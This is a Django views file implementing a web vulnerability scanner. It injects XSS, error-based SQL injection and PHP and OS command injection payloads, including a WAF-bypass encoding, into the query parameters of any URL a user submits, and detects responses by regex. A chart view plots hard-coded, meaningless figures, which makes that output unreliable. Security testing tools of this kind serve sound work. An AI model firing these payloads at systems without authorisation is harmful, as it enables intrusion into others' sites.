from django.shortcuts import render
import urllib.request
import urllib.error
import time
import re
from urllib.parse import urlparse
import matplotlib.pyplot as plt
import io
import urllib, base64


class HTTP_HEADER:
    HOST = "Host"
    SERVER = "Server"



def home(request):
    if request.method == 'POST':
        if not request.POST.get('url'):
            context = "No URL found."
            return render(request, 'home.html', context)
        else:
            url = request.POST['url']
            context = {
                'url': url
            }
            scanner(url, context) 
            if 'error' in context['headers']:
                context['error'] = context['headers']['error']
                return render(request, 'home.html', context)
            else:
                return render(request, 'output.html', context)
    return render(request, 'home.html')



# ============================================================== #


def headers_reader(url, context):
    headers = {
        'backendTech' : "Fingerprinted the Backend Technologies."
    }
    try:
        opener = urllib.request.urlopen(url)
        if opener.code == 200:
            headers['status'] = "Status Code: 200 OK"

        Host = url.split("/")[2]
        Server = opener.headers.get(HTTP_HEADER.SERVER)
        headers['host'] = "Host: " + str(Host)
        headers['server'] = "WebServer: " + str(Server)
        
        a = ''
        for item in opener.headers.items():
            for powered in item:
                sig = "x-powered-by"      
                if sig in item:
                    a = a + "[!] " + str(powered).strip() + '\n'
        headers['powered'] = a
    except urllib.error.HTTPError as e:
        if e.code == 404:
            headers['error'] = "[!] Page was not found! Please check the URL"
        else:
            headers['error'] = ("[!] HTTP Error:", e)
    
    context['headers'] = headers



def main_function1(url, payloads, check):
    # This function is going to split the url and try appending payloads in every parameter value.
    opener = urllib.request.urlopen(url)
    vuln = 0
    if opener.code == 999:
        # Detecting the WebKnight WAF from the StatusCode.
        # print("[~] WebKnight WAF Detected!")
        # print("[~] Delaying 3 seconds between every request")
        time.sleep(3)
    query_params = urlparse(url).query
    if query_params:
        for params in query_params.split("&"):
            for payload in payloads:
                bugs = url.replace(params, params + str(payload).strip())
                request = urllib.request.urlopen(bugs)
                html = request.readlines()
                for line in html:
                    checker = re.findall(check, line.decode())
                    if len(checker) != 0:
                        vuln += 1
    if vuln == 0:
        return "[!] Target is not vulnerable!"
    else:
        return "[!] Congratulations you've found %i bugs :-)" % vuln



def main_function2(url, payloads, check):
    opener = urllib.request.urlopen(url)
    vuln = 0
    if opener.code == 999:
        time.sleep(3)
    query_params = urlparse(url).query
    if query_params:
        for params in query_params.split("&"):
            for payload in payloads:
                encoded_payload = urllib.parse.quote(payload)
                bugs = url.replace(params, params + encoded_payload)
                try:
                    request = urllib.request.urlopen(bugs)
                    html = request.readlines()
                    for line in html:
                        checker = re.findall(check, line.decode())
                        if len(checker) != 0:
                            vuln += 1
                except urllib.error.HTTPError as e:
                    pass
                except urllib.error.URLError as e:
                    pass
                except ValueError as e:
                    pass
    if vuln == 0:
        return "[!] Target is not vulnerable!"
    else:
        return "[!] Congratulations you've found %i bugs :-)" % vuln



# Remote Code Execution (RCE)
def rce_func(url, context):
    # headers_reader(url)
    # Remote Code Injection Payloads
    payloads = [';${@print(md5(zigoo0))}', ';${@print(md5("zigoo0"))}']
    # Encrypted Payloads to bypass some Security Filters & WAF's
    payloads += ['%253B%2524%257B%2540print%2528md5%2528%2522zigoo0%2522%2529%257D%2529%257D%253B']
    # Remote Command Execution Payloads
    payloads += [';uname;', '&&dir', '&&type C:\\boot.ini', ';phpinfo();', ';phpinfo']
    # Used re.I to fix the case-sensitive issues like "payload" and "PAYLOAD".
    check = re.compile("51107ed95250b4099a0f481221d56497|Linux|eval\(\)|SERVER_ADDR|Volume.+Serial|\[boot", re.I)
    context['rce'] = main_function2(url, payloads, check)




def js_injection_func(url, context):
    # headers_reader(url)    
    # JavaScript Injection Payloads
    payloads = ['<script>alert("XSS")</script>',
                '<img src=x onerror=alert("XSS")>',
                '<svg/onload=alert("XSS")>',
                '"><svg/onload=alert("XSS")>',
                '"><script>alert("XSS")</script>']
    
    # Regular expression to check for JavaScript execution
    check = re.compile(r'<script>alert\("XSS"\)</script>|<img src=x onerror=alert\("XSS"\)>|<svg/onload=alert\("XSS"\)>|"\"><svg/onload=alert\("XSS"\)>|"\"><script>alert\("XSS"\)</script>', re.I)
    context['js'] = main_function2(url, payloads, check)



# Cross-site scripting (XSS)
def xss_func(url, context):
    # Payloads for XSS
    payloads = ['%27%3Ezigoo0%3Csvg%2Fonload%3Dconfirm%28%2Fzigoo0%2F%29%3Eweb', '%78%22%78%3e%78']
    payloads += ['%22%3Ezigoo0%3Csvg%2Fonload%3Dconfirm%28%2Fzigoo0%2F%29%3Eweb', 'zigoo0%3Csvg%2Fonload%3Dconfirm%28%2Fzigoo0%2F%29%3Eweb']
    check = re.compile('zigoo0<svg|x>x', re.I)
    context['xss'] = main_function1(url, payloads, check)


def error_based_sqli_func(url, context):
    # Payload = 12345'"\'\");|]*{%0d%0a<%00>%bf%27'  Yeaa let's bug the query :D :D
    # Added Chinese characters to the SQLI payloads to bypass mysql_real_escape_*
    payloads = ["3'", "3%5c", "3%27%22%28%29", "3'><", "3%22%5C%27%5C%22%29%3B%7C%5D%2A%7B%250d%250a%3C%2500%3E%25bf%2527%27"]
    check = re.compile("Incorrect syntax|Syntax error|Unclosed.+mark|unterminated.+qoute|SQL.+Server|Microsoft.+Database|Fatal.+error", re.I)
    context['sqli'] = main_function1(url, payloads, check)



def scanner(url, context):
    headers_reader(url, context)
    if not 'error' in context['headers']:
        xss_func(url, context)
        error_based_sqli_func(url, context)
        js_injection_func(url, context)
        rce_func(url, context)

def report(request):
    xdata = [90.43,23,54,76,120]
    ydata=["Security","Mallfaction","Cyber","Networking","Authentication "]
    plt.figure(figsize=(8, 4))
    plt.bar(ydata, xdata, color='blue')
    plt.xlabel('dark-tracing')
    plt.ylabel('Values')
    plt.title('Dark tracing for early ')

    # Save the chart to a BytesIO object
    buf = io.BytesIO()
    plt.savefig(buf, format='png')
    plt.close()
    buf.seek(0)
    image_base64 = base64.b64encode(buf.read()).decode('utf-8')
    buf.close()

    # Pass the base64 image to the template
    context = {
        'chart_image': image_base64,
    }
    return render(request, 'report.html', context)
